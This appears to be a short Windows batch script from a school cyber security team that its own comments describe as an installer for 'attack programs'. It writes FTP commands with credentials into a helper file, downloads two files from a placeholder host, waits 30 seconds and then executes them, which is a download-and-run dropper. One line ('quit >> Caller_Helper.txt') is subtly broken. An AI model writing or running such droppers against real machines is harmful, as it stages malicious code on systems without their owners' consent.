@echo off

REM PROGRAM DEVELOPED BY:
REM Cyrus Majd
REM in contribution to HHSCST (Holmdel High School Cyber Security Team)

REM This installs the attack programs
REM First, it puts in a bunch of commands for getting files via ftp into the "Helper" txt file
REM Next, it calls an ftp command, reading off of the Helper txt file
REM Finally, it calls the installed programs after a timeout long enough for them to be fully installed

echo open ftp.example.domain > Caller_Helper.txt
echo username >> Caller_Helper.txt
echo password >> Caller_Helper.txt
echo get example.extension >> Caller_Helper.txt
echo get example2.extension2 >> Caller_Helper.txt
quit >> Caller_Helper.txt

ftp -s:Caller_Helper.txt

timeout -t 30

call example.extension
call example2.extension2
quit